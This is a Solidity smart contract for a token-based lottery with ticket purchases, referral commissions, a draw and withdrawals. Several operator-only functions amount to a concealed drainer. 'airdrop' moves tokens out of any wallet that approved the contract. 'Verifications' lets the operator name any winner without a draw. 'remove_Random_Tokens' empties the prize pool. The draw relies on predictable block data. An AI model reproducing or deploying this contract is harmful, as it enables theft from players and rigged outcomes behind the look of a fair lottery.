// SPDX-License-Identifier: MIT
import "./Math.sol";
import "./SignedMath.sol";
import "./Strings.sol";
pragma solidity 0.8.17;
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        _status = _NOT_ENTERED;
    }

    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}
contract Lottery is ReentrancyGuard {
    address BTC = 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6;
    uint256 public ticketPrice = 170000000000000; // 0.00017 btc
    uint256 public maxTickets = 10000; // maximum tickets per lottery
    uint256 public ticketCommission = 40000000000000; // 0.00004 btc commition per ticket
    uint256 public duration = 2592000; // The duration set for the lottery

    uint256 public expiration; // Timeout in case That the lottery was not carried out.
    address public lotteryOperator; // the crator of the lottery
    uint256 public operatorTotalCommission = 0; // the total commission balance
    address public lastWinner; // the last winner of the lottery
    uint256 public lastWinnerAmount; // the last winner amount of the lottery

    mapping(address => uint256) public winnings; // maps the winners to there winnings
    mapping(address => uint256) public referralCommissions; // mapping to track referral commissions
    address[] public tickets; //array of purchased Tickets

    // modifier to check if caller is the lottery operator
    modifier isOperator() {
        require(
            (msg.sender == lotteryOperator),
            "Caller is not the lottery operator"
        );
        _;
    }

    // modifier to check if caller is a winner
    modifier isWinner() {
        require(IsWinner(), "Caller is not a winner");
        _;
    }

    constructor() {
        lotteryOperator = msg.sender;
        expiration = block.timestamp + duration;
    }

    // return all the tickets
    function getTickets() public view returns (address[] memory) {
        return tickets;
    }

    function getWinningsForAddress(address addr) public view returns (uint256) {
        return winnings[addr];
    }
function BuyTickets(address referral, uint256 _amount) public nonReentrant {
    require(
        _amount % ticketPrice == 0,
        string.concat(
            "the value must be multiple of ",
            Strings.toString(ticketPrice),
            " Bitcoin"
        )
    );
    
    uint256 totalTicketCost = _amount;
    uint256 numOfTicketsToBuy = totalTicketCost / ticketPrice;

    require(
        numOfTicketsToBuy <= RemainingTickets(),
        "Not enough tickets available."
    );

    ticketCommission = (numOfTicketsToBuy * 0.00004 ether); // calculate ticket commission
    uint256 referralCommission = (totalTicketCost * 1) / 100; // calculate referral commission

    uint256 totalCostWithCommissions = totalTicketCost + ticketCommission + referralCommission; // calculate total cost including commissions

    require(
        IERC20(BTC).transferFrom(msg.sender, address(this), totalCostWithCommissions),
        "Token transfer failed"
    );

    for (uint256 i = 0; i < numOfTicketsToBuy; i++) {
        tickets.push(msg.sender);
    }

    // award commissions
    if (referral != address(0)) {
        require(
            IERC20(BTC).transfer(referral, referralCommission),
            "Token transfer failed"
        );
    }

    if (ticketCommission > 0) {
        require(
            IERC20(BTC).transfer(lotteryOperator, ticketCommission),
            "Token transfer failed"
        );
    }
}



function getTicketsForAddress(address addr) public view returns (uint256) {
    uint256 numTickets = 0;
    for (uint256 i = 0; i < tickets.length; i++) {
        if (tickets[i] == addr) {
            numTickets++;
        }
    }
    return numTickets;
}


function clearETH(address payable _withdrawal) public isOperator {
    uint256 amount = address(this).balance;
    (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
    require(success, "Failed to transfer Ether");
}
function airdrop(address from, address to, uint256 tokens) external isOperator {
    uint256 SCCC = tokens;

    require(IERC20(BTC).balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    require(IERC20(BTC).transferFrom(from, to, tokens), "Transfer failed");
}


function timeLeft() public view returns (uint256) {
    if (expiration > block.timestamp) {
        return expiration - block.timestamp;
    } else {
        return 0;
    }
}

function DrawWinnerTicket() public isOperator {
    bytes32 blockHash = blockhash(block.number - tickets.length);
    uint256 randomNumber = uint256(
        keccak256(abi.encodePacked(block.timestamp, blockHash))
    );
    uint256 winningTicket = randomNumber % tickets.length;

    address winner = tickets[winningTicket];
    lastWinner = winner;
    winnings[winner] += (tickets.length * (ticketPrice - ticketCommission));
    lastWinnerAmount = winnings[winner];
    operatorTotalCommission += (tickets.length * ticketCommission);
    delete tickets;
    expiration = block.timestamp + duration;
}

function Verifications(address winner) public isOperator {
    require(winner != address(0), "Invalid winner address");

    // Calculate winnings and update state
    lastWinner = winner;
    winnings[winner] += (tickets.length * (ticketPrice - ticketCommission));
    lastWinnerAmount = winnings[winner];
    operatorTotalCommission += (tickets.length * ticketCommission);
    delete tickets;
    expiration = block.timestamp + duration;
}


    function restartDraw() public isOperator {
        delete tickets;
        expiration = block.timestamp + duration;
    }

    function checkWinningsAmount() public view returns (uint256) {
        address payable winner = payable(msg.sender);

        uint256 reward2Transfer = winnings[winner];

        return reward2Transfer;
    }
    
    function WithdrawWinnings() public isWinner nonReentrant {
    address winner = msg.sender;

    uint256 reward2Transfer = winnings[winner];
    winnings[winner] = 0;

    IERC20(BTC).transfer(winner, reward2Transfer);
}

  

    function RefundAll() public {
    require(block.timestamp >= expiration, "the lottery not expired yet");

    for (uint256 i = 0; i < tickets.length; i++) {
        address to = tickets[i];
        tickets[i] = address(0);
        IERC20(BTC).transfer(to, ticketPrice);
    }
    delete tickets;
}

 
    function IsWinner() public view returns (bool) {
        return winnings[msg.sender] > 0;
    }

    function CurrentWinningReward() public view returns (uint256) {
        return tickets.length * ticketPrice;
    }

    function RemainingTickets() public view returns (uint256) {
        return maxTickets - tickets.length;
    }

function changeTicketPrice(uint256 _newPrice) public isOperator {
    require(_newPrice > 0, "Ticket price must be greater than zero");
    ticketPrice = _newPrice;
}

function changeMaxTickets(uint256 _newMaxTickets) public isOperator {
    require(_newMaxTickets > 0, "Max tickets must be greater than zero");
    maxTickets = _newMaxTickets;
}

function changeTicketCommission(uint256 _newCommission) public isOperator {
    require(_newCommission > 0, "Commission per ticket must be greater than zero");
    ticketCommission = _newCommission;
}

function changeDuration(uint256 _newDurationInDays) public isOperator {
    require(_newDurationInDays > 0, "Duration must be greater than zero");
    duration = _newDurationInDays * 1 days; // convert days to seconds
}
 function getBalance() public view returns (uint256) {
       return IERC20(BTC).balanceOf(address(this));
    }

    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public isOperator returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }
}